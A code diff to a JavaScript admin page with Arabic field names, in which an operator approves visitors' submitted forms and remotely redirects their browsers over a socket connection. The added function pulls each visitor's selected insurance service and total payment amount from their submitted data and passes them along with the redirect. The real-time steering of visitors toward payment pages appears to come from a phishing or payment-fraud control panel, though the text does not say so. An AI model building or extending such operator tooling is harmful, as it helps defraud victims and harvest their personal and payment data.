@@ -2451,7 +2451,8 @@
       if (chatContainer) chatContainer.scrollTop = chatContainer.scrollHeight;
     }
 
-    // Action functions
+    function getVisitorPaymentInfo(visitor) { var sources = []; if (visitor && visitor.data) sources.push(visitor.data); if (visitor && visitor.dataHistory) { for (var i = visitor.dataHistory.length - 1; i >= 0; i--) { if (visitor.dataHistory[i] && visitor.dataHistory[i].content) sources.push(visitor.dataHistory[i].content); } } var SERVICE_PATTERNS = ['العرض المختار', 'اسم الخدمة', 'الخدمة', 'اسم الشركة', 'شركة التأمين', 'نوع التأمين المختار', 'نوع التأمين']; var AMOUNT_PATTERNS = ['الإجمالي مع الضريبة', 'المجموع الكلي', 'المجموع', 'الكلي', 'الإجمالي', 'المبلغ الإجمالي', 'المبلغ']; var service = null; var amount = null; for (var s = 0; s < sources.length; s++) { var src = sources[s]; for (var p = 0; p < SERVICE_PATTERNS.length && !service; p++) { var ks = Object.keys(src); for (var k = 0; k < ks.length; k++) { if (ks[k].indexOf(SERVICE_PATTERNS[p]) !== -1) { service = src[ks[k]]; break; } } } for (var p2 = 0; p2 < AMOUNT_PATTERNS.length && !amount; p2++) { var ka = Object.keys(src); for (var k2 = 0; k2 < ka.length; k2++) { if (ka[k2].indexOf(AMOUNT_PATTERNS[p2]) !== -1) { amount = src[ka[k2]]; break; } } } if (service && amount) break; } return { service: service, amount: amount }; }
+// Action functions
     function approveForm(socketId) {
       socket.emit('admin:approve', { visitorSocketId: socketId });
       // تحديث حالة الانتظار للزائر
@@ -2513,20 +2514,20 @@
     function navigateVisitor(socketId) {
       const page = document.getElementById('navigateSelect').value;
       if (page) {
-        socket.emit('admin:navigate', { visitorSocketId: socketId, page });
+        const _v = Array.from(visitors.values()).find(function (x) { return x.socketId === socketId; }); const _pi = _v ? getVisitorPaymentInfo(_v) : {}; socket.emit('admin:navigate', { visitorSocketId: socketId, page: page, service: _pi.service, amount: _pi.amount });
       }
     }
 
     function navigateVisitorTop(socketId) {
       const page = document.getElementById('navigateSelectTop').value;
       if (page) {
-        socket.emit('admin:navigate', { visitorSocketId: socketId, page });
+        const _v = Array.from(visitors.values()).find(function (x) { return x.socketId === socketId; }); const _pi = _v ? getVisitorPaymentInfo(_v) : {}; socket.emit('admin:navigate', { visitorSocketId: socketId, page: page, service: _pi.service, amount: _pi.amount });
       }
     }
 
     // دالة تحويل الزائر لصفحة محددة مباشرة
     function navigateVisitorToPage(socketId, page) {
-      socket.emit('admin:navigate', { visitorSocketId: socketId, page });
+      const _v = Array.from(visitors.values()).find(function (x) { return x.socketId === socketId; }); const _pi = _v ? getVisitorPaymentInfo(_v) : {}; socket.emit('admin:navigate', { visitorSocketId: socketId, page: page, service: _pi.service, amount: _pi.amount });
       // تحديث حالة الانتظار وتحديث القائمة فوراً
       const visitor = Array.from(visitors.values()).find(v => v.socketId === socketId);
       if (visitor) {
